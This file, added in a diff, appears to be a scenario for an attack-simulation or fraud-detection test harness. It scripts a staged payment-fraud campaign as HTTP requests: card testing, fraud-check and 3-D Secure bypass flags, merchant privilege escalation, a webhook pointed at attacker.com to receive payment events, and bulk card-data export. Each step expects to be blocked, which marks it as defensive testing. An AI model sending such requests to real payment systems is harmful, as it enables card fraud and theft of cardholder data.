@@ -1,0 +1,355 @@
+{
+  "id": "payment-processing-fraud",
+  "name": "Payment Processing Fraud Campaign",
+  "category": "Payment Security",
+  "difficulty": "Expert",
+  "description": "Comprehensive payment fraud attack targeting payment gateways and card processing systems with BIN attacks, card testing, gateway bypass techniques, merchant account compromise, and PCI-DSS compliance violations",
+  "tags": [
+    "payment-processing",
+    "card-testing",
+    "bin-attacks",
+    "pci-dss",
+    "merchant-fraud",
+    "gateway-bypass",
+    "financial-fraud"
+  ],
+  "steps": [
+    {
+      "id": "pay-recon-1",
+      "name": "Payment Gateway Discovery",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/payments/config",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          "Accept": "application/json"
+        }
+      },
+      "execution": {
+        "delayMs": 500
+      }
+    },
+    {
+      "id": "pay-recon-2",
+      "name": "Payment Methods Enumeration",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/payments/methods",
+        "headers": {
+          "Accept": "application/json",
+          "X-API-Version": "v1"
+        }
+      },
+      "execution": {
+        "delayMs": 600
+      },
+      "dependsOn": [
+        "pay-recon-1"
+      ]
+    },
+    {
+      "id": "pay-recon-3",
+      "name": "Merchant Account Discovery",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/merchant/info",
+        "headers": {
+          "Accept": "application/json",
+          "User-Agent": "PaymentBot/1.0"
+        }
+      },
+      "execution": {
+        "delayMs": 800
+      },
+      "dependsOn": [
+        "pay-recon-2"
+      ]
+    },
+    {
+      "id": "pay-deliver-1",
+      "name": "BIN Range Testing - Visa",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/cards/validate",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "192.168.1.50"
+        },
+        "body": "{\"cardNumber\": \"4111111111111111\", \"expiryMonth\": \"12\", \"expiryYear\": \"2025\", \"cvv\": \"123\", \"holderName\": \"Test User\"}"
+      },
+      "execution": {
+        "delayMs": 100
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "pay-recon-3"
+      ]
+    },
+    {
+      "id": "pay-deliver-2",
+      "name": "BIN Range Testing - MasterCard",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/cards/validate",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Real-IP": "203.0.113.25"
+        },
+        "body": "{\"cardNumber\": \"5555555555554444\", \"expiryMonth\": \"06\", \"expiryYear\": \"2026\", \"cvv\": \"999\", \"holderName\": \"John Smith\"}"
+      },
+      "execution": {
+        "delayMs": 120
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "pay-deliver-1"
+      ]
+    },
+    {
+      "id": "pay-deliver-3",
+      "name": "Card Testing - Low Value Transactions",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/payments/process",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Client-IP": "198.51.100.33",
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+        },
+        "body": "{\"cardNumber\": \"4532015112830366\", \"expiryMonth\": \"09\", \"expiryYear\": \"2024\", \"cvv\": \"737\", \"amount\": 1.00, \"currency\": \"USD\", \"description\": \"Test transaction\"}"
+      },
+      "execution": {
+        "delayMs": 200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "pay-deliver-2"
+      ]
+    },
+    {
+      "id": "pay-exploit-1",
+      "name": "Payment Gateway Parameter Manipulation",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/payments/process",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "10.0.0.1",
+          "X-Gateway-Override": "test-mode"
+        },
+        "body": "{\"cardNumber\": \"4000000000000002\", \"expiryMonth\": \"12\", \"expiryYear\": \"2025\", \"cvv\": \"123\", \"amount\": 100.00, \"currency\": \"USD\", \"bypass_fraud_checks\": true, \"test_mode\": true, \"force_approve\": true}"
+      },
+      "execution": {
+        "delayMs": 800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "pay-deliver-3"
+      ]
+    },
+    {
+      "id": "pay-exploit-2",
+      "name": "CVV Bypass Attempt",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/payments/process",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-CVV-Skip": "merchant_request"
+        },
+        "body": "{\"cardNumber\": \"4111111111111111\", \"expiryMonth\": \"03\", \"expiryYear\": \"2027\", \"amount\": 250.00, \"currency\": \"USD\", \"skip_cvv\": true, \"merchant_id\": \"bypass_001\"}"
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "pay-exploit-1"
+      ]
+    },
+    {
+      "id": "pay-exploit-3",
+      "name": "3D Secure Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/payments/3ds/bypass",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer fake_merchant_token"
+        },
+        "body": "{\"cardNumber\": \"5200828282828210\", \"expiryMonth\": \"01\", \"expiryYear\": \"2025\", \"amount\": 500.00, \"currency\": \"USD\", \"bypass_3ds\": true, \"liability_shift\": false, \"merchant_override\": \"high_value_customer\"}"
+      },
+      "execution": {
+        "delayMs": 1200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "pay-exploit-2"
+      ]
+    },
+    {
+      "id": "pay-exploit-4",
+      "name": "Merchant Account Privilege Escalation",
+      "stage": "exploitation",
+      "request": {
+        "method": "PUT",
+        "url": "/api/merchant/settings",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer compromised_merchant_token",
+          "X-Admin-Override": "emergency_access"
+        },
+        "body": "{\"transaction_limits\": {\"daily_limit\": 999999.99, \"per_transaction\": 50000.00}, \"fraud_checks\": false, \"manual_review_threshold\": 999999.99, \"risk_level\": \"low\", \"pci_compliance_override\": true}"
+      },
+      "execution": {
+        "delayMs": 1500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "pay-exploit-3"
+      ]
+    },
+    {
+      "id": "pay-persist-1",
+      "name": "Persistent Payment Token Creation",
+      "stage": "persistence",
+      "request": {
+        "method": "POST",
+        "url": "/api/payments/tokens/create",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer escalated_merchant_access"
+        },
+        "body": "{\"cardNumber\": \"4000000000000069\", \"tokenType\": \"persistent\", \"scope\": [\"charge\", \"refund\", \"void\"], \"expires\": \"2099-12-31\", \"description\": \"Automated billing system\", \"bypass_validation\": true}"
+      },
+      "execution": {
+        "delayMs": 1800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "pay-exploit-4"
+      ]
+    },
+    {
+      "id": "pay-persist-2",
+      "name": "Webhook Endpoint Manipulation",
+      "stage": "persistence",
+      "request": {
+        "method": "POST",
+        "url": "/api/merchant/webhooks",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer persistent_token_001"
+        },
+        "body": "{\"url\": \"https://attacker.com/payment-webhook\", \"events\": [\"payment.succeeded\", \"payment.failed\", \"payment.disputed\", \"customer.created\"], \"secret\": \"compromised_webhook_key\", \"enabled\": true}"
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "pay-persist-1"
+      ]
+    },
+    {
+      "id": "pay-exfil-1",
+      "name": "Payment Data Extraction",
+      "stage": "exfiltration",
+      "request": {
+        "method": "GET",
+        "url": "/api/payments/export?format=csv&include_pii=true&include_card_data=true",
+        "headers": {
+          "Authorization": "Bearer persistent_token_001",
+          "Accept": "application/octet-stream",
+          "X-Export-Override": "compliance_audit"
+        }
+      },
+      "execution": {
+        "delayMs": 2500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "pay-persist-2"
+      ]
+    },
+    {
+      "id": "pay-exfil-2",
+      "name": "High-Value Fraudulent Transaction",
+      "stage": "exfiltration",
+      "request": {
+        "method": "POST",
+        "url": "/api/payments/process",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer persistent_token_001",
+          "X-Transaction-Priority": "high",
+          "X-Fraud-Override": "whitelisted_merchant"
+        },
+        "body": "{\"cardNumber\": \"4000000000000077\", \"expiryMonth\": \"12\", \"expiryYear\": \"2026\", \"cvv\": \"123\", \"amount\": 25000.00, \"currency\": \"USD\", \"description\": \"Bulk service payment\", \"skip_fraud_checks\": true, \"force_settlement\": true, \"merchant_category\": \"trusted\"}"
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "pay-exfil-1"
+      ]
+    },
+    {
+      "id": "pay-exfil-3",
+      "name": "PCI-DSS Violation - Card Data Logging",
+      "stage": "exfiltration",
+      "request": {
+        "method": "POST",
+        "url": "/api/logging/payment-debug",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer persistent_token_001",
+          "X-Debug-Level": "full",
+          "X-PCI-Override": "development_environment"
+        },
+        "body": "{\"log_level\": \"debug\", \"include_card_numbers\": true, \"include_cvv\": true, \"include_expiry\": true, \"store_duration\": \"permanent\", \"export_format\": \"plaintext\", \"reason\": \"fraud_investigation\"}"
+      },
+      "execution": {
+        "delayMs": 3500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "pay-exfil-2"
+      ]
+    }
+  ]
+}
